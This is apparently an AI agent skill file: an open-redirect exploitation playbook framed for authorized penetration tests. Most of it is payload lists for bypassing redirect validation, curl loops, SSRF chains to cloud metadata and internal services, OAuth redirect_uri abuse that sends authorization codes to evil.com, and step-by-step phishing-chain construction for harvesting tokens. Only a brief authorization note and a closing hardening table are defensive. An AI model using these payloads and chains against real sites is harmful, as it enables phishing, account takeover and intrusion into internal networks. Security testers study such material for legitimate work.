---
id: open-redirect
name: open-redirect
description: >
  Open redirect exploitation for authorized penetration tests. Covers parameter
  identification, redirect chain construction, bypass techniques (//evil.com, backslash,
  %09/%0a encoding, unicode variants), SSRF elevation via open redirect, phishing chains,
  and OAuth redirect_uri abuse. Triggers on: open redirect, URL redirect bypass,
  redirect_uri abuse, unvalidated redirect, SSRF via redirect, OAuth redirect, phishing
  redirect, location header injection.
triggers:
  - open redirect
  - URL redirect bypass
  - redirect_uri abuse
  - unvalidated redirect
  - SSRF via redirect
  - OAuth redirect
  - phishing redirect
  - location header injection
  - next parameter redirect
  - return_url redirect
---

# Open Redirect Exploitation

## Authorization Gate

STOP. Confirm written authorization. Open redirects can cause real harm to users if
exploited in live phishing campaigns — test existence only; never run phishing against
real users during an assessment without explicit written scope.

---

## 1. Finding Open Redirect Parameters

### 1.1 Common Parameter Names

```bash
# Parameter names that commonly contain redirect URLs
declare -a params=(
  "redirect" "redirect_uri" "redirect_url" "return" "return_url" "returnUrl"
  "next" "next_url" "nextUrl" "goto" "url" "target" "redir" "ref" "referer"
  "destination" "dest" "out" "continue" "path" "view" "forward" "location"
  "back" "callback" "cb" "link" "img_url" "checkout_url" "to" "from"
  "sign_in_url" "success_url" "cancel_url" "error_url" "homepage"
)

# Test each parameter with a redirect to your collaborator
COLLAB="https://ATTACKER.interactsh.com"
BASE_URL="https://TARGET"

for param in "${params[@]}"; do
  code=$(curl -so /dev/null -w "%{http_code}" -L --max-redirs 0 \
    "$BASE_URL/?$param=$COLLAB")
  echo "$code — $param"
done
```

### 1.2 Automated Discovery

```bash
# gf (tomnomnom) — filter for redirect params in Burp history export
cat burp_history.txt | gf redirect

# waybackurls + gf combination
echo TARGET | waybackurls | gf redirect | sort -u | head -50

# Also check in JavaScript files
curl -s https://TARGET/static/app.js | grep -oP '(redirect|return|next|goto)["\s]*[=:]["\s]*[^"&]+' | head -20

# Burp Suite — search for 302/301 responses in Proxy history
# Filter: Response code = 302 AND response header = Location
```

### 1.3 Manual Identification

```bash
# Login flow — most common location for open redirects
# Observe: POST /login?next=ORIGINAL_PAGE
# Test:   POST /login?next=https://evil.com

# After logout  
# Observe: GET /logout?redirect=/dashboard
# Test:    GET /logout?redirect=https://evil.com

# OAuth flow
# Observe: GET /oauth/authorize?redirect_uri=https://TARGET/callback
# Test:    GET /oauth/authorize?redirect_uri=https://evil.com

# Check Location header in 301/302 responses
curl -sI "https://TARGET/some-page" | grep -i location
```

---

## 2. Basic Open Redirect Bypass Techniques

### 2.1 Protocol Variations

```bash
# Standard HTTPS redirect
?redirect=https://evil.com
?redirect=http://evil.com

# Protocol-relative (//evil.com = same-protocol redirect)
?redirect=//evil.com
?redirect=\/\/evil.com  # backslash variant
?redirect=\\/\\/evil.com

# Non-standard protocols (may bypass http/https check)
?redirect=javascript:alert(1)  # XSS via redirect
?redirect=data:text/html,<script>alert(1)</script>

# No protocol (relative path attack)
?redirect=//evil.com/path
?redirect=///evil.com
```

### 2.2 Host Confusion

```bash
# Bypass "starts with TARGET" checks
# If validator checks: starts with "https://TARGET"
?redirect=https://TARGET.evil.com          # subdomain confusion
?redirect=https://evil.com?TARGET          # param after domain
?redirect=https://evil.com#TARGET          # fragment
?redirect=https://evil.com/TARGET          # path component
?redirect=https://TARGET@evil.com          # credentials confusion
?redirect=https://TARGET%40evil.com        # URL-encoded @

# Bypass "ends with TARGET" checks
?redirect=https://evil.com.TARGET          # domain ends with TARGET
?redirect=https://evil.TARGET              # different TLD

# Bypass contains check
?redirect=https://evil.com/TARGET/evil     # contains in path
?redirect=https://evil.com?ref=TARGET      # contains in param
```

### 2.3 Path Traversal in Redirect

```bash
# Open redirect via path traversal
?redirect=///evil.com
?redirect=/\evil.com
?redirect=/.evil.com
?redirect=/../../evil.com

# Absolute URL with path traversal
?redirect=https://TARGET/../../evil.com
```

---

## 3. Encoding Bypass Techniques

### 3.1 URL Encoding

```bash
# Single URL encoding
?redirect=%68%74%74%70%73%3A%2F%2Fevil.com  # https://evil.com

# Double URL encoding (if server decodes twice)
?redirect=%2568%2574%2574%2570%2573%253A%252F%252Fevil.com

# Partial encoding
?redirect=https://evil%2Ecom    # encoded dot
?redirect=https://evil%2fcom    # encoded slash → no match

# Encoding slashes in //evil.com
?redirect=%2F%2Fevil.com
?redirect=%5C%5Cevil.com       # \\evil.com (backslash)
```

### 3.2 Whitespace and Control Characters

```bash
# Whitespace characters (may be stripped, bypassing validation of leading chars)
?redirect=%09https://evil.com    # tab (%09)
?redirect=%0Ahttps://evil.com    # newline (%0a)
?redirect=%0Dhttps://evil.com    # carriage return (%0d)
?redirect=%20https://evil.com    # space
?redirect=%00https://evil.com    # null byte

# Combine: tab before protocol
?redirect=%09//evil.com
?redirect=%0D%0Ahttps://evil.com

# Unicode whitespace
?redirect=%E2%80%8Bhttps://evil.com   # zero-width space (U+200B)
?redirect=%C2%ADhttps://evil.com       # soft hyphen (U+00AD)
```

### 3.3 Unicode Normalization

```bash
# Punycode / IDN homograph
# evil.com → xn--vil-poa.com (if Cyrillic 'е' used instead of 'e')
?redirect=https://evіl.com   # Cyrillic і (U+0456) instead of i

# Unicode full-width characters
?redirect=ｈｔｔｐｓ://evil.com   # fullwidth h,t,t,p,s
?redirect=https://ｅｖｉｌ.com

# Enclosed alphanumerics and other substitutes
# Domain: evil.com → use Unicode lookalikes in the check string
```

---

## 4. SSRF via Open Redirect

### 4.1 Chaining Open Redirect to SSRF

```bash
# Scenario: application fetches a URL server-side after an open redirect
# Example: PDF generator, image downloader, webhook, health checker

# Step 1: Confirm the open redirect
curl -sI "https://TARGET/redirect?url=https://ATTACKER.com" | grep Location

# Step 2: If app fetches the redirect destination server-side:
# Point redirect to internal services
curl -s "https://TARGET/redirect?url=http://169.254.169.254/latest/meta-data/"  # AWS IMDS
curl -s "https://TARGET/redirect?url=http://127.0.0.1:8080/admin"               # internal admin
curl -s "https://TARGET/redirect?url=http://192.168.1.1/admin"                  # internal network

# Step 3: Chain — fetch URL → redirect → SSRF target
# If the app sends HTTP requests to the redirect_url:
# /redirect?url=https://evil.com/redirect?url=http://169.254.169.254/

# SSRF whitelist bypass via open redirect
# Target restricts fetches to TARGET domain only
# But TARGET has an open redirect to arbitrary URLs
# So: fetch https://TARGET/redirect?url=http://169.254.169.254/
# Server fetches TARGET (allowed), gets redirect to metadata IP, follows it
```

### 4.2 Request Smuggling via Redirect to Internal

```bash
# If the app follows redirects to internal IPs:
# Force redirect chain: TARGET → evil.com → 127.0.0.1/internal

# Host evil.com redirect:
# HTTP/1.1 302 Found
# Location: http://127.0.0.1:6379/  ← Redis

# Send to target:
curl -s "https://TARGET/fetch?url=https://TARGET/redir?next=http://evil.com/redis-redirect"
```

---

## 5. OAuth redirect_uri Abuse

### 5.1 Open Redirect in OAuth Flow

```bash
# Normal OAuth flow:
# GET /oauth/authorize?client_id=APP&redirect_uri=https://TARGET/callback&...

# Test 1: Replace redirect_uri with attacker domain
curl -sI "https://OAUTH_SERVER/oauth/authorize?\
client_id=APP&\
redirect_uri=https://evil.com&\
response_type=code&\
scope=openid"

# Test 2: Use open redirect on TARGET to redirect to evil.com
# redirect_uri=https://TARGET/redirect?url=https://evil.com
ENCODED_REDIRECT=$(python3 -c "import urllib.parse; print(urllib.parse.quote('https://evil.com'))")
curl -sI "https://OAUTH_SERVER/oauth/authorize?\
client_id=APP&\
redirect_uri=https://TARGET/redirect?url=$ENCODED_REDIRECT&\
response_type=code&\
scope=openid"

# If successful: OAuth code is sent to evil.com → attacker steals code → account takeover

# Test 3: subdomain wildcard bypass
# Some OAuth servers allow *.TARGET.com
curl -sI "https://OAUTH_SERVER/oauth/authorize?\
client_id=APP&redirect_uri=https://evil.TARGET.com/callback&response_type=code"

# Test 4: Path traversal in redirect_uri
curl -sI "https://OAUTH_SERVER/oauth/authorize?\
client_id=APP&redirect_uri=https://TARGET.com/callback/../../../evil.com&response_type=code"
```

### 5.2 State Parameter Tampering

```bash
# CSRF via missing state validation
# If state param is not validated, CSRF login/code injection possible
curl -sI "https://OAUTH_SERVER/oauth/authorize?\
client_id=APP&redirect_uri=https://TARGET/callback&response_type=code&state=ATTACKER_STATE"

# Check if TARGET/callback validates state matches session
```

---

## 6. Phishing Chain Construction

### 6.1 Trusted Domain Phishing

```bash
# Construct phishing URL that appears legitimate
# Users see: https://TARGET/login?next=https://evil.com/fake-login

# The landing page at evil.com/fake-login clones TARGET's login page
# User trusts the URL because it starts with TARGET domain

# Sample chain:
PHISHING_URL="https://TARGET/login?next=https://evil.com/harvest?org=TARGET"

# Even better — chain through multiple trusted redirects:
# https://TARGET/redirect?url=https://partner.com/sso?return=https://evil.com

# Browser shows TARGET domain until the final redirect executes
```

### 6.2 Token Theft via Redirect

```bash
# If tokens/sensitive data are passed in URL fragments or parameters post-auth:
# 1. Trigger auth flow that puts token in redirect destination
# 2. Poison the redirect destination to attacker site
# 3. Attacker's server logs the token from URL

# Example: password reset token in redirect
# /reset?token=ABC123&redirect=https://evil.com
# Evil.com logs incoming request URL → captures token
```

---

## 7. Testing with Tools

### 7.1 OpenRedirex

```bash
# https://github.com/devanshbatham/OpenRedireX
git clone https://github.com/devanshbatham/OpenRedireX
cd OpenRedireX

# Test single URL
python3 openredirex.py -u "https://TARGET/redirect?url=FUZZ" \
  --payloads payloads.txt

# Bulk test from gau output
gau TARGET | grep "redirect\|next\|url=" | \
  python3 openredirex.py --payloads payloads.txt
```

### 7.2 Manual Burp Suite Workflow

```
1. Proxy → HTTP History → filter for 301/302 responses
2. Right-click → Send to Repeater
3. Modify the redirect parameter value systematically:
   - Replace with https://evil.com
   - Replace with //evil.com
   - Replace with \\evil.com
   - Encode the payload
4. Check Location header in response
5. Check if server follows redirect (for SSRF)
```

### 7.3 Nuclei Templates

```bash
nuclei -u https://TARGET \
  -t http/vulnerabilities/generic/open-redirect.yaml \
  -t http/fuzzing/redirect/ \
  -o nuclei-redirect.txt

# Also test with ffuf against parameter list
ffuf -w redirect_params.txt:PARAM -w redirect_payloads.txt:PAYLOAD \
  -u "https://TARGET/login?PARAM=PAYLOAD" \
  -mc 301,302 \
  -fr "https://TARGET" \
  -o ffuf-redirect.txt
```

---

## 8. Open Redirect Payloads Reference

```
// Protocol variations
https://evil.com
http://evil.com
//evil.com
\/\/evil.com
\\/\\/evil.com
javascript:alert(1)

// Whitespace bypass
%09https://evil.com
%0ahttps://evil.com
%0dhttps://evil.com

// Encoding
%68%74%74%70%73%3A%2F%2Fevil.com
https://evil%2Ecom
https:%2F%2Fevil.com

// Host confusion
https://evil.com?TARGET
https://evil.com#TARGET
https://TARGET@evil.com
https://TARGET%40evil.com
https://TARGET.evil.com

// Path traversal
///evil.com
/\evil.com
/.evil.com

// IP-based (bypasses domain check)
http://0x41.0x41.0x41.0x41  (hex IP)
http://2130706433           (decimal IP for 127.0.0.1)
http://0177.0.0.1           (octal IP)
```

---

## 9. Hardening

| Attack | Detection Signal | Hardening Fix |
|---|---|---|
| External redirect | 302 Location points to non-TARGET domain | Allowlist of valid redirect destinations |
| Protocol bypass | //evil.com or javascript: in redirect param | Strip leading //, validate scheme explicitly |
| Encoding bypass | Encoded chars in redirect URL | URL-decode before validation |
| OAuth redirect_uri | Non-whitelisted redirect_uri | Exact URI match, no wildcard, no open redirect on same domain |
| SSRF via redirect | Server follows redirect to internal IP | Block redirects to RFC1918 IPs; validate before following |

```python
# Python safe redirect
from urllib.parse import urlparse

ALLOWED_DOMAINS = {'target.com', 'www.target.com', 'app.target.com'}

def is_safe_redirect(url):
    parsed = urlparse(url)
    # Require scheme to be http/https
    if parsed.scheme not in ('http', 'https'):
        return False
    # Strip port for domain check
    host = parsed.netloc.split(':')[0].lower()
    return host in ALLOWED_DOMAINS
```

---

## Related Skills

- `ssrf-specialist` — escalating open redirect to full SSRF
- `xss-specialist` — javascript: scheme open redirect leading to XSS
- `oauth-oidc-attacks` — OAuth redirect_uri abuse chains
- `recon-specialist` — discovering open redirect parameters at scale
- `waf-bypass-techniques` — encoding bypass for WAF-protected redirects
